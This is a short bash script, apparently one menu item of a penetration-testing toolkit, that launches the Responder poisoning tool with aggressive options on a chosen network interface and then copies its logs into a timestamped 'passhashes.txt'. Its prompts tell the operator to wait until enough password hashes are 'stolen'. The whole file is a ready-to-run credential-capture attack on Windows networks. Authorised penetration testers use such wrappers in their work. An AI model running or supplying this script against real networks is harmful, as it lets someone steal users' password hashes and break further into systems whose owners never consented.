#!/bin/bash
echo "Responder requires the user to press CTRL+C to close the script"
echo "Press CTRL+C after the desired number of password hashes are stolen to"
echo "continue with the process."
read -p "Press Enter to continue..."
clear
ifconfig
read -p "Enter the interface attached to the windows network: " interface
if [ ! -d Responder ] ; then mkdir Responder ; fi
responder -I $interface -rwfFP
datetime=$(date +%F_%T)
mkdir Responder/$datetime
cat /usr/share/responder/logs/* >> Responder/$datetime/passhashes.txt

read -p "Press Enter to return to the main menu"
